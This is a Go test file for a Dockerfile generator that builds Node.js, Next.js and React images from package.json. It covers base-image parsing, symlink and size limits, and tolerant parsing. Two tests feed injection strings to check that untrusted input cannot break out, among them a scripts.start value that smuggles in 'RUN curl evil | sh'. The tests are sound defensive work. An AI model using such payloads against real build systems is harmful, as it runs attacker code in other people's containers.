package build

import (
	"encoding/json"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"
)

func TestNodejsDockerfileDefaults(t *testing.T) {
	want := `FROM node:20-alpine

WORKDIR /app

# Install dependencies first (better caching)
COPY package*.json ./

RUN npm ci --only=production

# Copy source code
COPY . .

# Expose port
EXPOSE 3000

# Start application
CMD ["sh", "-c", "node index.js"]`
	if got := NodejsDockerfile(PackageJSON{}); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestNodejsDockerfileWithBuildAndNodemon(t *testing.T) {
	pkg := PackageJSON{Scripts: map[string]string{"start": "nodemon server.js", "build": "tsc"}}
	pkg.Engines.Node = ">=18"
	want := `FROM node:18-alpine

WORKDIR /app

# Install dependencies first (better caching)
COPY package*.json ./

RUN npm ci --only=production

# Copy source code
COPY . .

# Build application
RUN npm run build

# Expose port
EXPOSE 3000

# Start application
CMD ["sh", "-c", "node server.js"]`
	if got := NodejsDockerfile(pkg); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestStartCommandPriority(t *testing.T) {
	cases := []struct {
		scripts map[string]string
		want    string
	}{
		{map[string]string{"start": "node a.js", "serve": "x"}, `CMD ["sh", "-c", "npm start"]`},
		{map[string]string{"start:prod": "x", "serve": "y"}, `CMD ["sh", "-c", "npm run start:prod"]`},
		{map[string]string{"serve": "y"}, `CMD ["sh", "-c", "npm run serve"]`},
	}
	for _, c := range cases {
		got := NodejsDockerfile(PackageJSON{Scripts: c.scripts})
		if last := got[len(got)-len(c.want):]; last != c.want {
			t.Errorf("scripts %v: last line %q, want %q", c.scripts, last, c.want)
		}
	}
}

func TestBaseImage(t *testing.T) {
	cases := map[string]string{"": "node:20-alpine", "20-alpine": "node:20-alpine", "^20.11.0": "node:20.11.0-alpine", ">=18": "node:18-alpine"}
	for in, want := range cases {
		pkg := PackageJSON{}
		pkg.Engines.Node = in
		if got := baseImage(pkg); got != want {
			t.Errorf("baseImage(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestNextjsDockerfile(t *testing.T) {
	want := `FROM node:20-alpine

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source code
COPY . .

# Build Next.js app
RUN npm run build

# Expose port (Next.js default is 3000)
EXPOSE 3000

# Start Next.js in production mode
CMD ["npm", "start"]
`
	if got := NextjsDockerfile(PackageJSON{}); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestReactDockerfile(t *testing.T) {
	want := `# Build stage
FROM node:20-alpine AS builder

WORKDIR /app

# Install dependencies
COPY package*.json ./
RUN npm ci

# Copy source and build
COPY . .
RUN npm run build

# Production stage with nginx
FROM nginx:alpine

# Copy built files from builder stage
COPY --from=builder /app/dist /usr/share/nginx/html

# Create nginx config for SPA routing
RUN echo 'server { listen 80; location / { root /usr/share/nginx/html; try_files $uri $uri/ /index.html; } }' > /etc/nginx/conf.d/default.conf

EXPOSE 80

CMD ["nginx", "-g", "daemon off;"]
`
	if got := ReactDockerfile(PackageJSON{}, "dist"); got != want {
		t.Fatalf("got:\n%s", got)
	}
}

func TestReactOutputDir(t *testing.T) {
	dir := t.TempDir()
	if got := ReactOutputDir(dir); got != "build" {
		t.Fatalf("no vite config: %s", got)
	}
	os.WriteFile(filepath.Join(dir, "vite.config.ts"), []byte(""), 0o644)
	if got := ReactOutputDir(dir); got != "dist" {
		t.Fatalf("vite.config.ts: %s", got)
	}
}

func TestReadPackageJSON(t *testing.T) {
	dir := t.TempDir()
	if pkg := ReadPackageJSON(dir); pkg.Scripts != nil {
		t.Fatal("missing file should give empty package")
	}
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{"scripts":{"start":"node x"},"engines":{"node":"22"}}`), 0o644)
	pkg := ReadPackageJSON(dir)
	if pkg.Scripts["start"] != "node x" || pkg.Engines.Node != "22" {
		t.Fatalf("got %+v", pkg)
	}
	os.WriteFile(filepath.Join(dir, "package.json"), []byte(`{broken`), 0o644)
	if pkg := ReadPackageJSON(dir); pkg.Scripts != nil {
		t.Fatal("malformed file should give empty package")
	}
}

func TestReadPackageJSONSymlinkEscape(t *testing.T) {
	outside := t.TempDir()
	secret := filepath.Join(outside, "package.json")
	if err := os.WriteFile(secret, []byte(`{"scripts":{"start":"node x"},"engines":{"node":"22"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	repo := t.TempDir()
	if err := os.Symlink(secret, filepath.Join(repo, "package.json")); err != nil {
		t.Fatal(err)
	}
	pkg := ReadPackageJSON(repo)
	if pkg.Scripts != nil || pkg.Engines.Node != "" {
		t.Fatalf("symlink escaping the repo must read as missing, got %+v", pkg)
	}
}

func TestReactOutputDirSymlinkEscape(t *testing.T) {
	outside := t.TempDir()
	target := filepath.Join(outside, "vite.config.ts")
	if err := os.WriteFile(target, []byte(""), 0o600); err != nil {
		t.Fatal(err)
	}
	repo := t.TempDir()
	if err := os.Symlink(target, filepath.Join(repo, "vite.config.ts")); err != nil {
		t.Fatal(err)
	}
	if got := ReactOutputDir(repo); got != "build" {
		t.Fatalf("escaping vite config symlink must read as missing, got %q", got)
	}
}

func TestReadPackageJSONInRepoSymlinkAllowed(t *testing.T) {
	repo := t.TempDir()
	if err := os.WriteFile(filepath.Join(repo, "real.json"), []byte(`{"engines":{"node":"22"}}`), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("real.json", filepath.Join(repo, "package.json")); err != nil {
		t.Fatal(err)
	}
	if pkg := ReadPackageJSON(repo); pkg.Engines.Node != "22" {
		t.Fatalf("in-repo symlink should resolve, got %+v", pkg)
	}
}

// A tenant-controlled scripts.start flows into the CMD line; it must not be
// able to end the JSON string or the line and add Docker instructions.
func TestNodejsDockerfileStartCannotBreakOut(t *testing.T) {
	evil := "nodemon x\"]\nRUN curl evil | sh\nCMD [\"a"
	got := NodejsDockerfile(PackageJSON{Scripts: map[string]string{"start": evil}})
	for _, line := range strings.Split(got, "\n") {
		if strings.HasPrefix(line, "RUN curl") || line == `CMD ["a` {
			t.Fatalf("injected instruction line %q in:\n%s", line, got)
		}
	}
	lines := strings.Split(got, "\n")
	last := lines[len(lines)-1]
	var cmd []string
	if !strings.HasPrefix(last, "CMD ") || json.Unmarshal([]byte(strings.TrimPrefix(last, "CMD ")), &cmd) != nil ||
		len(cmd) != 3 || cmd[2] != strings.Replace(evil, "nodemon", "node", 1) {
		t.Fatalf("CMD line is not a faithful JSON array: %q", last)
	}
}

func TestBaseImageCannotInject(t *testing.T) {
	pkg := PackageJSON{}
	pkg.Engines.Node = "20\nRUN evil AS x @sha256:abc"
	got := baseImage(pkg)
	if strings.ContainsAny(got, " \n@") {
		t.Fatalf("unsafe image reference %q", got)
	}
}

// packageJSONOfSize returns valid package.json bytes of exactly n bytes.
func packageJSONOfSize(t *testing.T, n int) []byte {
	t.Helper()
	const head = `{"engines":{"node":"22"},"pad":"`
	const tail = `"}`
	pad := n - len(head) - len(tail)
	if pad < 0 {
		t.Fatalf("size %d too small", n)
	}
	b := []byte(head + strings.Repeat("x", pad) + tail)
	if len(b) != n {
		t.Fatalf("built %d bytes, want %d", len(b), n)
	}
	return b
}

func TestReadPackageJSONSizeCap(t *testing.T) {
	const limit = 1 << 20
	cases := []struct {
		name     string
		size     int
		wantNode string
	}{
		{"exactly at cap", limit, "22"},
		{"one byte over cap", limit + 1, ""},
		{"far over cap", 4 * limit, ""},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "package.json"), packageJSONOfSize(t, c.size), 0o600); err != nil {
				t.Fatal(err)
			}
			if got := ReadPackageJSON(dir).Engines.Node; got != c.wantNode {
				t.Fatalf("engines.node = %q, want %q", got, c.wantNode)
			}
		})
	}
}

func TestReadPackageJSONNotRegularFile(t *testing.T) {
	dir := t.TempDir()
	if err := os.Mkdir(filepath.Join(dir, "package.json"), 0o755); err != nil {
		t.Fatal(err)
	}
	if pkg := ReadPackageJSON(dir); pkg.Scripts != nil || pkg.Engines.Node != "" {
		t.Fatalf("directory must read as missing, got %+v", pkg)
	}
}

func TestGenerateDockerfile(t *testing.T) {
	const pkgJSON = `{"scripts":{"start":"node app.js"},"engines":{"node":"18"}}`
	cases := []struct {
		name        string
		serviceType string
		files       map[string]string
		want        []string // lines that must appear exactly; nil means the result must be ""
	}{
		{"nodejs", "nodejs", map[string]string{"package.json": pkgJSON},
			[]string{"FROM node:18-alpine", `CMD ["sh", "-c", "npm start"]`, "RUN npm ci --only=production"}},
		{"nextjs", "nextjs", map[string]string{"package.json": pkgJSON},
			[]string{"FROM node:18-alpine", `CMD ["npm", "start"]`, "RUN npm run build"}},
		{"react with vite", "react", map[string]string{"package.json": pkgJSON, "vite.config.ts": ""},
			[]string{"FROM node:18-alpine AS builder", "COPY --from=builder /app/dist /usr/share/nginx/html", `CMD ["nginx", "-g", "daemon off;"]`}},
		{"react without vite", "react", map[string]string{"package.json": pkgJSON},
			[]string{"FROM node:18-alpine AS builder", "COPY --from=builder /app/build /usr/share/nginx/html", `CMD ["nginx", "-g", "daemon off;"]`}},
		{"nodejs without package.json", "nodejs", nil,
			[]string{"FROM node:20-alpine", `CMD ["sh", "-c", "node index.js"]`}},
		{"docker", "docker", map[string]string{"package.json": pkgJSON}, nil},
		{"mongodb", "mongodb", nil, nil},
		{"redis", "redis", nil, nil},
		{"empty type", "", map[string]string{"package.json": pkgJSON}, nil},
		{"unknown type", "unknown", map[string]string{"package.json": pkgJSON}, nil},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			for name, body := range c.files {
				if err := os.WriteFile(filepath.Join(dir, name), []byte(body), 0o600); err != nil {
					t.Fatal(err)
				}
			}
			got := GenerateDockerfile(c.serviceType, dir)
			if c.want == nil {
				if got != "" {
					t.Fatalf("want empty Dockerfile, got:\n%s", got)
				}
				return
			}
			lines := strings.Split(got, "\n")
			for _, w := range c.want {
				if !slices.Contains(lines, w) {
					t.Errorf("missing line %q in:\n%s", w, got)
				}
			}
		})
	}
}

func TestReadPackageJSONTolerant(t *testing.T) {
	cases := []struct {
		name        string
		body        string
		wantScripts map[string]string
		wantNode    string
	}{
		{"engines is a string", `{"engines":"node >=14","scripts":{"start":"node x"}}`, map[string]string{"start": "node x"}, ""},
		{"engines.node is a number", `{"engines":{"node":18},"scripts":{"start":"node x"}}`, map[string]string{"start": "node x"}, ""},
		{"scripts is a string", `{"scripts":"oops","engines":{"node":"22"}}`, nil, "22"},
		{"non-string script skipped", `{"scripts":{"x":1,"start":"node x"},"engines":{"node":"22"}}`, map[string]string{"start": "node x"}, "22"},
		{"start is a number", `{"scripts":{"start":5,"serve":"node s"},"engines":{"node":"22"}}`, map[string]string{"serve": "node s"}, "22"},
		{"scripts is null", `{"scripts":null,"engines":{"node":"22"}}`, nil, "22"},
		{"unknown fields ignored", `{"name":"x","version":1,"engines":{"node":"22"}}`, nil, "22"},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(c.body), 0o600); err != nil {
				t.Fatal(err)
			}
			pkg := ReadPackageJSON(dir)
			if pkg.Engines.Node != c.wantNode || len(pkg.Scripts) != len(c.wantScripts) {
				t.Fatalf("got %+v, want scripts %v node %q", pkg, c.wantScripts, c.wantNode)
			}
			for k, v := range c.wantScripts {
				if pkg.Scripts[k] != v {
					t.Fatalf("scripts[%q] = %q, want %q (got %+v)", k, pkg.Scripts[k], v, pkg)
				}
			}
		})
	}
}

func TestReadPackageJSONMalformedStaysEmpty(t *testing.T) {
	for _, body := range []string{`{broken`, ``, `[1,2]`, `"str"`, `{"scripts":{"start":"x"}`} {
		dir := t.TempDir()
		if err := os.WriteFile(filepath.Join(dir, "package.json"), []byte(body), 0o600); err != nil {
			t.Fatal(err)
		}
		if pkg := ReadPackageJSON(dir); pkg.Scripts != nil || pkg.Engines.Node != "" {
			t.Errorf("%q: want empty, got %+v", body, pkg)
		}
	}
}

func TestBaseImageFallback(t *testing.T) {
	cases := []struct{ in, want string }{
		{"^18 || ^20", "node:18-alpine"},
		{">=18 <21", "node:18-alpine"},
		{"18.x", "node:18.x-alpine"},
		{"lts/*", "node:20-alpine"},
		{">=", "node:20-alpine"},
		{"^", "node:20-alpine"},
		{"-x", "node:20-alpine"},
		{"   ", "node:20-alpine"},
		{"latest", "node:20-alpine"},
		{"22-alpine3.19", "node:22-alpine3.19"},
	}
	for _, c := range cases {
		pkg := PackageJSON{}
		pkg.Engines.Node = c.in
		if got := baseImage(pkg); got != c.want {
			t.Errorf("baseImage(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}
